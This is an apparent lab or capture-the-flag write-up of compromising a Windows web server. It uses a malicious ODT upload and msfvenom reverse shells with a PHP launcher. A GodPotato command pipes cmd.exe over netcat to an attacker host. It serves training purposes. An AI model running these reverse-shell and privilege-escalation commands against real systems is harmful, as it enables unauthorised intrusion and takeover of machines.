#Pwned! 
```IP
192.168.229.169
```
# Enumeration
Its blocking pings
```
sudo nmap -sCV 192.168.229.169 -vvv -oA enum/nmap.full -p- -Pn
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241121102019.png?raw=true)
It is a Windows machine most likely running an Apache httpd 2.4.48 on port 80
## HTTP 80
```
ffuf -u http://192.168.229.169/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241121095928.png?raw=true)
Submiting php
File is not valid. Please submit ODT file
# Exploitation
creation of a malicious file

https://github.com/0bfxgh0st/MMG-LO/blob/main/mmg-odt.py
```
python mmg-odt.py windows 192.168.45.190 80
```
we upload the file.odt and
we get the reverse shell
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241121115800.png?raw=true)
# PrivEsc

## Manual
SYSTEMINFO
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241121120038.png?raw=true)
LISTENING PORTS
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241121120211.png?raw=true)
SOFTWARE
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241121120256.png?raw=true)

SERVICES
```
ResumeService1         Running C:\Program Files\nssm-2.24\win64\nssm.exe
ApacheHTTPServer       Running "C:\Xampp\apache\bin\httpd.exe" -k runservice
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241121122954.png?raw=true)
we can upload files to C:\xampp\htdocs\
we craft a shell
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.190 LPORT=4444 -f exe -o shell.exe
```
we craft a run.php file
```
<?php $exec = system('shell.exe', $val) ?>
```
we copy both files to C:\xampp\htdocs\
and run run.php which will run shell.exe
we are apache with SeImpersonatePrivilege 
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241121132253.png?raw=true)
```
.\GodPotato-NET4.exe -cmd ".\nc64.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.190 1234"
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241121132809.png?raw=true)

## Automated

### Peass
```
File: C:\Program Files (x86)\Common Files\Java\Java Update\jusched.exe (Unquoted and Space detected) - C:\
```
### Mimikatz

# Lateral Movement

